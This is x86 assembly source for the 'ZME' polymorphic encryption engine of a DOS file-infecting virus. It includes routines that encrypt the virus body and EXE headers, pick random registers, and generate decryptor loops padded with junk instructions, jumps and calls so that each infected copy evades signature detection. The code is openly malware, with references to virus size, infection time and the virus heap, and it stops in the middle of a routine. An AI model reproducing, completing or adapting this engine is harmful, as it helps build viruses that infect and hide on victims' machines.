code segment byte public
assume cs:code, ds:code, es:code, ss:code

INCLUDE ZURICH.ASI


extrn dataencriptor :near
extrn start_data    :near
extrn _____         :byte
extrn heap          :near
extrn vir_heap      :near
extrn get_cur_time  :near
extrn RANDOMIZE     :near
extrn dosseek_bof   :near
extrn read_buf_22   :near


.LALL

pblabel crypt_exe_header
;int 2bh
;    push    ax dx
;    call    dosseek_bof
;    call    read_buf_22
;    pop     dx ax
    mov     si, [exehdr.exe_par_dir]
    shl     si, 4
    sub     ax, si
    sbb     dx, 0
pblabel crypt_exe_header_custom
    movseg  ds, ss
    movseg  es, ss

;int 2bh
;    movseg  ds, cs
    call    RANDOMIZE
    lea     si, [vir_heap._exehdr.exe_len_mod_512]
    lea     di, [heap]
    mov     cx, exe_rle_table-exe_len_mod_512 ;14h
    mov     [engdata.zmefl], zmeflHDR
    jmp     ZME_crypt_custom
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel ZME_crypt
    cld
    mov     [engdata.zmefl], ax
    mov     [_____], al
    call    RND_INIT
    call    get_cur_time
    mov     [last_infect_time], ax
    mov     si, VIRUSSTACKSIZE
    mov     cx, offset start_data-VIRUSSTACKSIZE ;virus_size
pblabel ZME_crypt_custom
    mov     [engdata.datasize], cx
    mov     [engdata.targetptr], di
    rep     movsb          ;copy data
    ;< set next version probabilitys [di-virs-VIRUSSTACKSIZE+prEXE]


    mov     [engdata.jmp_after_decrypt], 0
    test    [engdata.cur_cryptlevel], 80h
    jz      ZME_crypt_
    call    ZME_crypt_ ;;;double crypt
    mov     di, [engdata.targetptr]
    mov     [engdata.jmp_after_decrypt], ax ;
    mov     [engdata.datasize], cx
    add     di, cx
pblabel ZME_crypt_
    push bx
    test    [engdata.zmeflags], MASK EN_BFR_GARBL
    DOIF NZ
        call    RND_GET_BYTE
        inc     ah
        add     [engdata.datasize], ax
        call    shit_ax
    DONE
;-----------------------------------------------------------------------------
 ;   ZME_INIT

    lea     si, [vir_heap._engdata.cJMP_patch]
    mov     cx, reg6- segm_IDT                  ; clear the work area with 0's
    DO
        mov     [si],ch               ;
        inc     si                    ;
    CYCLE LU
pblabel bad_reg
    DO
        call    RND_GET_THREE_BITS
        or      al,010b     ;AL := R_DX, R_BX, R_SI, R_DI
        cmp     al,R_DX
    CYCLE E                 ; not R_DX
    lea     bx, [vir_heap._engdata.reg0]
    mov     cx, 7
    jmp     SHORT ffound
    DO
        DO
            lea     si, [vir_heap._engdata.reg0-1]
            call    RND_GET_THREE_BITS
pblabel fill_registers
            inc     si
            cmp     si,bx
            EXIT E
            cmp     al,R_SP
            REPEAT E
            cmp     al,[si]
            jne      fill_registers
        CYCLE
pblabel ffound
        mov     [bx],al
        inc     bx
    CYCLE LU

    call    RND_GET_BYTE            ;   X < decriptor_data + initialIP
    mov     [engdata.value_X],ax         ;or X > decriptor_data + initialIP + datasize + 2

    call    RND_GET_BYTE            ;   Y < decriptor_data + initialIP - X
    mov     [engdata.value_Y],ax         ;or Y > decriptor_data + initialIP + datasize + 2 - X

    mov     cx, [engdata.datasize]
    sub     cx, 20h
    mov     ax, 3
    DOIF A
        DO
            call    RND_GET
            cmp     ax, cx
        CYCLE A
        or      al,101b
    DONE
    mov     [engdata.value_J], ax         ;value_J := 1..datasize-0E

;--------------------------------------------------------------------------------------
    mov     ax, di
    sub     ax, [engdata.targetptr]
    push    ax
;    cmp    byte ptr [engdata.zmefl+1], (zmeflOBJ shr 8) and 0FFh
;    DOIF E
;        lea si, PMtest
;        mov cx, 0Fh
;        rep movsb
;    DONE

;IRP foo, <50,B8,86,16,CD,2F,58,75,06,5F,55,8B,EC,FF,E7>
;sto_byte 0&foo&h
;ENDM



;store test for PM
;mov    ax,1600 (1686)  ; 0B8h, 86h, 16h, 0CDh, 2Fh, 75,
;int    2f
;cmp    ax,1600
;je     real
;pop    di
;push   bp
;mov    bp,sp
;jmp    di
;real:

    test    [engdata.zmeflags], MASK EN_SAVE_REGS
    DOIF NZ
IFDEF USE_PUSHA
    sto_byte opPUSHA
ELSE
        mov     cx, 7
        lea     si, [vir_heap._engdata.reg0]
        DO
            lodsb
            add     al, opPUSH_AX
            stosb
        CYCLE LU
ENDIF
    DONE

    mov     [engdata.useregs], REG_GARBL_ALL
    lea     si, [di+4]
    DO
        push    si
        mov     ax, 0Bh*2
        call    force_not_branch_garble
        pop     si
        cmp     si, di
    CYCLE A
    mov     cl, [engdata.zmeflags]
IF EN_BFR_GARBL
    shr     cl, EN_BFR_GARBL
ENDIF
    and     cx, MASK EN_BFR_GARBL
    DOIF NZ
        push    cx
        call    garble_more_reg_all
        call    encode_int21
        pop     cx
    CYCLE LU
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;    ENCODE_CRYPT_ROUTINE
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    mov     [engdata.useregs], REG_GARBL_ALL        ;
    mov     [engdata.begin_sub], 0          ;DON'T ENCODE CALL BACKWARD INTO DECRYPTOR
    lea     si, [dataencriptor]
    mov     cx, CRYPTLEVEL*4
    DO
        mov     byte ptr [si], opNOP
        inc     si
    CYCLE LU
    mov     byte ptr [si], opRETN
    call    garble_more
    test    [engdata.zmeflags], MASK EN_RELOCATOR
    DOIF NZ                 ; encode relocator
        sto_byte opCALL
        call    RND_GET_THREE_BITS
        inc ax
        stosw
        mov     [engdata.relocator_base], di
        call    SHIT_AX
        call    garble_more
        mov     al, [engdata.reg0]
        add     al, opPOP_AX ;pop r0
        stosb
        call   garble_more
        call    encode_reloc_patch
        mov     [engdata.reloff_1], di
        stosw
        call    encode_reloc_patch
        mov     [engdata.reloff_2], di
        stosw
    DONE
    call    garble_more
    mov     cl, [engdata.reg0]
    call    encode_zero_reg      ;encode MOV IDX ,0
    call    garble_more
    mov     cl, [engdata.reg2]        ;encode MOV TMP1, some
    call    encode_mov
    mov     [engdata.start_reg2], di
    stosw
    call    garble_more
    mov     cl, [engdata.reg3]        ;encode MOV TMP2, some
    call    encode_mov
    mov     [engdata.start_reg3], di
    stosw
    call    garble_more
    mov     [engdata.loop_top], di   ;loop peak
    call    garble_more
    mov     ax, [engdata.value_X]
    call    encode_add
    call    garble_more
    mov     cl, 4 ; 87 or 8B
    call    encode_reg_mem
    mov     ax, [engdata.value_X]
    neg     ax
    push    ax                     ;-(X+1)
    mov     bx, [engdata.reloff_1]
    call    encode_mem_access
    mov     cl, [engdata.cur_cryptlevel]
    and     cx, 7Fh ;mask ?
    DO
        push    cx
        mov     [engdata.useregs], REG_ENC_ALL        ;SET USED 1..3
        call    encode_one_crypt
        mov     [engdata.useregs], REG_GARBL_ALL        ;SET USED 4..6
        pop     cx
        cmp     cl, 5
        DOIF E
            call      garble_more
            mov       ax, [engdata.value_Y]
            call      encode_add
        DONE
    CYCLE LU
    mov     [engdata.useregs], REG_GARBL_ALL        ;SET USED 4..6
    mov     cl, 2 ; 87 or 89
    call    encode_reg_mem
    pop     ax                     ;-(X+1)
    sub     ax, [engdata.value_Y]
    push    ax                     ;-(X+Y)

    mov     bx, [engdata.reloff_2]
    call    encode_mem_access
    pop     ax                     ;-(X+Y)
    sub     ax, [engdata.value_J]        ;-(J+X+Y)
    call    encode_add
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;                 encoding GOTO loop_top
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    mov     [engdata.useregs], REG_GARBL_ALL or MASK REG_ENC ;
    mov     al, opJC    ;encode JC                     ;
    call    do_cond_jmp                            ;JC
    call    many_nonbranch_garble                ;Shit
    mov     ax, [engdata.datasize]                     ;
    dec     ax                                   ;
    call    encode_add                           ;ADD INDEX,value_J
    call    finish_cJMP
    mov     al, opJZ   ;encode JZ                     ;JZ
    call    do_cond_jmp                            ;
    call    many_nonbranch_garble                  ;Shit
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ;ฤฤฤฤฤฤฤฤฤฤฤฤฤ
;  ENCODE JMP NEAR Loop_Top                                    ;
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ;ฤฤฤฤฤฤฤฤฤฤฤฤฤ
    call    encode_jmp_near
    mov     ax, [engdata.loop_top]
    xor     bx, bx
    xchg    bx, [engdata.nJMP_patch]
    add     [bx], ax
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ;ฤฤฤฤฤฤฤฤฤฤฤฤฤ
    mov     [engdata.useregs], REG_ALL        ;;SET USED 0..6
    call    finish_cJMP
    call    garble_more                          ;
;ฤยยยฤยยฤยฤฤฤฤฤฤฤฤฤฤฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;ฤลมลยมลฤลฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤด
;ฤมฤมมฤมฤมฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู

;--------------------------------------------------------------------------------------
;sto_two_byte 0cdh, 2Bh
    test    [engdata.zmeflags], MASK EN_SAVE_REGS
    DOIF NZ
IFDEF USE_PUSHA
    sto_byte opPOPA
ELSE
        mov     cx, 7
        lea     si, [vir_heap._engdata.reg6]
        DO
            std
            lodsb
            add     al, opPOP_AX
            cld
            stosb
        CYCLE LU
ENDIF
    DONE

    test    [engdata.zmeflags], MASK EN_USE_JMPS
    DOIF Z
        sto_byte opRETN
    DONE

    call    encode_jmp_near
    mov     ax, [engdata.targetptr]
    add     ax, [engdata.jmp_after_decrypt]
    mov     bx, [engdata.nJMP_patch]
    add     [bx], ax
;crypt data                                                               ณ
;ฤลลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลลฤฤฤฤฤ----------
;ฤลมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลลฤฤฤฤฤ----------
;ฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ----------
    push    di
    mov     di, [engdata.targetptr]
    mov     si, [engdata.datasize]
    dec     si
    xor     bx, bx
    call    RND_GET
    xchg    ax, cx
    call    RND_GET
    xchg    ax, dx
     DO
        add     bx, [engdata.value_J]
        sub     bx, si
        DOIF C
            add     bx, si
        DONE
        mov     ax, [di][bx]
        call    dataencriptor      ;call encryptor
        mov     [di][bx], ax
        and     bx, bx
    CYCLE NZ
    mov     si, [engdata.start_reg2]
    mov     word ptr [si], cx
    mov     si, [engdata.start_reg3]
    mov     word ptr [si], dx
    pop     di
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
    mov     cx, di
    sub     cx, [engdata.targetptr]
    pop     ax
    pop     bx

    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;ฤยฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤยยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤยฤฤ
;ฤลฤฤฤฤฤฤยฤมฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤลลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤ
; ภฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤม             ฤมมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤม




































;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออฤฤ
pblabel encode_reloc_patch      ;add cs:[r0.(offset addbuf1-relocator_base)], r0
    call    garble_more
    sto_two_byte opSEGCS, 01
    mov     al, [engdata.reg0]
    mov     cl, 9
    mul     cl
    or      al, 10000100b
    cmp     al, (R_BX*9) or 10000100b
    DOIF NE
        xor     al, 00000010b
    DONE
    stosb
    mov     ax, [engdata.relocator_base]
    neg     ax
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออฤฤ




;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออฤฤ
pblabel encode_mem_access
    push    ax
    add     ax, VIRUSSTACKSIZE ;[engdata.sourceptr]
    and     bx, bx
    DOIF NZ
        add     [bx], di
        sub     ax, [engdata.relocator_base]
        add     ax, [engdata.targetptr]
        sub     ax, VIRUSSTACKSIZE ;[engdata.sourceptr]
    DONE
    stosw
    pop     ax
    jmp     garble_more
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออฤฤ





;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออฤฤ
pblabel encode_zero_reg      ;cl-register result - 2 byte stored
    call RND_GET_BYTE
    and      al, 8
    add      al, 2Bh
    stosb            ;store SUB | XOR R,R : 29, 2Bh, 31, 33
    mov      al, 9    ;cl-register
    mul      cl
    or       al, MASK M0D
    stosb
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ







;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel shit
    call RND_GET_THREE_BITS
    shr  al,1
    inc  ax
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel shit_AX
    xchg    cx,ax
    DO                              ;1 to 4 times
        call    RND_GET_BYTE
        stosb                       ;add any shit after crypt data
    CYCLE LU
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ






;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel choose_fake_mov  ;al=C0(add), C8(or), D0(adc), F0(xor)
    call     RND_GET_BYTE
    MASKA    al, 110xx000         ;al=C0(add), C8(or), D0(adc)
    cmp      al, 0D3h              ;no al=D8(sbb)
    DOIF A
        sub      al, 0D8h-0F0h      ;al := F0(xor)
    DONE
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ





;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel choose_wr_and_encode_mov
    call    choose_word_register  ; register for call offset
    xchg    cx, ax
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
pblabel encode_mov          ;cl-register; result - 1..4 byte stored
    call    RND_GET_BYTE
    DOIF C
        call      encode_zero_reg       ;reg:=0, CF:=0, possible use 'ADC'
        STO_BYTE 81h     ;store ADD | OR | XOR  R,value
                                ;future:
                                ;lea reg,[reg+] ?
;        mov     protect_reg, al
        call    choose_fake_mov
        cmp     cl, R_AX
        DOIF E
            ; transcoding:
            ; C0 ->  5
            ; C8 ->  D
            ; D0 -> 15
            ; F0 -> 35
            sub     al, 0C0h-5
            dec     di
        DONE
    DOELSE
        mov     al, 0B8h      ;MOV R,value  db B8;
    DONE
    or      al, cl
    stosb
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ












;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; ********
; zero reg
; add/adc/or/xor reg,mem
pblabel encode_reg_mem
    call    garble_more
    call    RND_GET_BYTE
    PASS C
    cmp     cl,  4               ;cl=4- 87 or 8B   mov r,[]
    DOIF E
        mov     cl, [engdata.reg1]
        call    encode_zero_reg
        call    garble_more
        call    choose_fake_mov
        cmp     al, 0D0h ;adc
        DOIF E
            call    choose_word_register
            call    encode_zero_reg
            mov     al, 0D0h
        DONE
        add     al, (80h+80h)+3-0C0h-87h    ;3, b, 13, 33
        mov     cx, ax
    DONE
    and     al, cl           ;cl=2- 87 or 89   mov [],r
    add     al, 87h          ;cl=4- 87 or 8B   mov r,[]
    mov     ah, [engdata.reg1]
    shl     ah, REG
    or      ah, [engdata.reg0]
    or      ah, 10000100b
    cmp     [engdata.reg0], R_BX
    DOIF NE
       and     ah, 11111101b
    DONE
    mov     byte ptr [di], opSEGCS
    inc     di
    stosw
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ




;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel encode_add          ;al-value, add reg0, value
    push    ax
    mov     al,[engdata.reg0]
    add     al,0C0h
    mov     ah,al
    mov     al,81h
    stosw
    pop     ax
    stosw
    ret
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ








;อัออออออัอออออออออออออออออออออออออออออออออออออออออัออออออออออออออออออออออออฤ
; ณ ZME  ณ      ENCODE ONE CRYPT OPERATION         ณ
;อฯออออออฯอออออออออออออออออออออออออออออออออออออออออฯออออออออออออออออออออออออฤ
pblabel encode_one_crypt
    DO
        call    RND_GET_BYTE
        and     al, 00001110b
        cmp     al, [engdata.lastgarble]
    CYCLE E
pblabel force_choice_crypt_operation
    mov     [engdata.lastgarble], al
    xchg    ax, bx
    mov     cx, word ptr encrypt_opcode_table[bx]
    neg     bl
    add     bl, sizeof_encrypt_opcode_table-2
    mov     dx, word ptr encrypt_opcode_table[bx]
    and     cl, not 1        ;clear size data flag
    and     dl, not 1        ;clear size data flag
    call    RND_GET_BYTE
    and     al, ch                   ; patch it into the top
    and     al, 3                    ; this line unnecessary
    or      cl, al                   ; byte for variable opcodes
    or      dl, al                   ; byte for variable opcodes
    and     dh, not MASK R_M
    and     ch, not MASK R_M
    DOIF Z
        call    choose_register
        mov     ah, [engdata.lastchoose] ;lastchoose=1, 2, 3 ณ -1 ณ ax, cx, dx,
        dec     ah    ;al=lastchoose(1,2,3)+(0,4)-1= (0,1,2) or (4,5,6)
        shl     ax, REG
        or      ch, al
        or      dh, ah
;        IF CRYPTLEVEL GT 8
            ;;;;;;;;IF YOU HAVE ANY TROUBLE - UNCOMMENT THIS;
            and     [engdata.useregs], not MASK REG_ENC        ;SET USED 2..3
            ;do not reg1 in r/m field if use two register
;        ENDIF
        test    cl, 1
        DOIF NZ
            and     dh, 11011011b    ;don't use BP, SI, DI
        DONE
    DONE
    call    choose_register
    or      ch, al
    or      ch, MASK M0D            ;no use memory
    or      dh, [engdata.lastchoose]
    dec     dh
    or      dh, MASK M0D            ;no use memory
    test    cl, 1                ;use word
    DOIF NZ
        and     dh, 11111011b    ;don't use BP, SI, DI
        or      dl, 1
    DONE
    cmp     al, R_AX
;    mov     ax, cx
    sto_word_ cx
    DOIF E  ;optimize for ax/al
        test   al, 01111110b
        DOIF Z
            and    al, 1
            or     al, ah
            MASKA  al, 00xxx10x
            dec    di
            dec    di
            stosb
        DONE
    DONE
    sub     si, 4
    mov     word ptr [si], dx
    test    cl, 01111110b    ;al - high byte of opcode = ch
    DOIF Z
        call    RND_GET
        stosw
        cmp     cl, 81h  ;16 bit
        DOIF NE
            dec     di
            mov     ah, opNOP
        DONE
        mov     word ptr [si][2], ax
    DONE
    mov     [engdata.useregs], REG_GARBL_ALL
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
   test    [engdata.zmeflags], MASK EN_INT_GARBL
   jz      garble_more  ;0
   mov ax, 1
   jmp      garble_more_AX
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ






;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel garble_more_reg_all
    mov      [engdata.useregs], REG_ALL  ;SET USED all registers
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
pblabel garble_more
    call    RND_GET_THREE_BITS
    and     al, not 4 ;1
pblabel garble_more_AX
    push    si cx
    xchg    cx, ax
    inc     cx              ;garble count = 4..7
    DO
        push    cx                      ; save garble count
        call    garble_once             ; garble ***MACRO***
        pop     cx                      ; restore garble count
    CYCLE LU
    call    finish_cJMP             ; if so, finish it
    call    many_nonbranch_garble   ; garble garble
    mov     bx, [engdata.nJMP_patch]      ; check if pending nJMP
    and     bx, bx
    DOIF NZ
        STO_BYTE opRETN               ; encode a RETN
        call    shit                  ; after RETN - any shit !
        add     [bx], di
        mov     bx, [engdata.end_of_jmp]
        mov     [engdata.begin_sub], bx
        mov     word ptr [engdata.nJMP_patch], 0
        call    many_nonbranch_garble   ; garble
    DONE
    pop     cx si
    retn
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ





;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel many_nonbranch_garble
    call    RND_GET_THREE_BITS           ; do large instruction
    shr     ax, 1
    inc     ax
    xchg    cx, ax
    DO
        call    not_branch_garble_with_save_cx
    CYCLE LU
    retn
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ




;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel finish_cJMP ;
    DO
        mov     ax, di                   ; get current location
        mov     bx, [engdata.cJMP_patch]      ; get previous location
        and     bx, bx                   ; in not open cJmp
        JZ      @@retn                  ; cJMP_patch == 0? i.e. is
        sub     ax, bx                   ; there an unfinished cJMP?
        dec     ax                      ; calculate offset
        EXIT NZ
        call    not_branch_garble       ; fill in some instructions
    CYCLE
    cmp     al, 7Fh                   ; are we close enough?
    DOIF A                          ; if so, finish this now
        mov     al, 0                ; if not, encode cJMP $+2
    DONE
    mov     [bx], al                 ; patch the cJMP destination
    mov     word ptr [engdata.cJMP_patch], 0 ; clear usage flag
@@retn:
    retn
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ




;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel do_one_byte
    call    choose_register
    cmp     al, R_AX
    lea     bx, onebyte_table
    DOIF E                           ; if possible use AX as garbage
       lea     bx, onebyte_table_ax
    DONE
    call    RND_GET_THREE_BITS
    xlat
    cmp     al, 40h
    GOIN E
    cmp     al, 48h                  ; DEC or INC ??
    DOIF E                         ; all other onebyte command have opcode great 48h
        xchg    cx, ax
        call    choose_word_register
        add     al, cl
    DONE
    stosb
    retn
;endp
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ









;อฤ encode ฤ branch ฤ garbles ฤอออออออออออออออออออออออออออออออออออออออออออออ
pblabel garble_once
    call    RND_GET
    jp      encode_CALL
    jb      encode_int21
    jz      encode_cond_jmp
    jo      not_branch_garble
    js      do_one_byte
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
    test    [engdata.zmeflags], MASK EN_USE_CALL
    jz     garble_once
    cmp     word ptr [engdata.cJMP_patch], 0 ; is there an unfinished
    jnz     finish_cJMP
;ฤ encode jmp near ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
pblabel encode_jmp_near
    cmp     word ptr [engdata.nJMP_patch], 0 ; is there an unfinished
    jnz     encode_cond_jmp

    test    [engdata.zmeflags], MASK EN_RELOCATOR
;    jnz     encode_jmp_nearE9 ;< jmp looptop & jmp virus (E9) if relocator
    GOIN NZ
    call    RND_GET_BYTE
    DOIF NZ
        sto_byte opJMPN
        mov     [engdata.nJMP_patch], di ; save location to patch
        xor     ax, ax
        call    sto_min_di_2
    DOELSE                               ; encode JMP register
        call    choose_wr_and_encode_mov
        mov     [engdata.nJMP_patch], di   ; save location to patch
        xor     ax, ax
        call    setup_reg
        or      ah, cl              ;ax= 0E0FFh
        stosw
    DONE
    call    shit                     ; after jmp - any shit ! <<<<<<debug
    mov     [engdata.end_of_jmp], di
    jmp     garble_once
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ


;ฤ encode a conditional jmp ฤอออออออออออออออออออออออออออออออออออออออออออออออ
pblabel encode_cond_jmp
    test    [engdata.zmeflags], MASK EN_USE_JMPS
    jz      garble_once
    cmp     word ptr [engdata.cJMP_patch], 0 ; is there an unfinished
    jnz     finish_cJMP
    call    RND_GET_BYTE
    DOIF Z
        MASKA al, 010000x0                ;encode cmp/test before Jx
        call    force_not_branch_garble
    DONE
pblabel @encode_cond_jmp
    call    RND_GET_BYTE
    test    al, 1010b                       ; don't encode jo/jno/jpo/jpe
    jpe     @encode_cond_jmp
    MASKA   al, 0111xxxx              ; encode a conditional jmp
    push    ax                       ; opcode 72..79, 7B..7F
    call    choose_word_register
    cmp     al, R_CX
    pop     ax
    DOIF E                          ; if possible use CX as garbage
         MASKA   al, 111000xx         ; encode a conditional loop/jcxz
    DONE                            ; opcode E0..E3
pblabel do_cond_jmp
    stosb
    mov     [engdata.cJMP_patch], di      ; save target offset
    stosb
    jmp many_nonbranch_garble
    retn
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ



;ฤ encode CALL ฤออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
pblabel encode_CALL
    test    [engdata.zmeflags], MASK EN_USE_CALL
    jz      garble_once
    cmp     byte ptr [di-3], opCALL ;<<<debug
    jz      encode_cond_jmp
    cmp     word ptr [engdata.begin_sub], 0 ; is there one pending?
    jz      encode_cond_jmp           ; encode cond jmp
    test    [engdata.zmeflags], MASK EN_RELOCATOR
    GOIN NZ
    ror     al, 1
    DOIF C
         sto_byte opCALL                  ; call near
